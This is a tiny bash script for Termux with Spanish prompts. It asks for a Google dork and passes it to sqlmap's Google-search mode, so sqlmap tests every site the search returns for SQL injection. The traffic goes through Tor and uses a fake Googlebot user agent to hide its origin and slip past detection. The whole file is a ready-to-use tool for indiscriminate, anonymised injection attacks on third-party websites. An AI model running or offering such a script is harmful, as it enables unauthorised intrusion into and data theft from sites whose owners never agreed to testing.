#!/data/data/com.termux/files/usr/bin/bash
read -p "ingresa tu dork": dork
python2 sqlmap.py --tor-type=SOCKS5 --tor-port=9149 --user-agent="Googlebot (compatible;Googlebot/2.1; +http://www.google.com/bot.html)" -g $dork
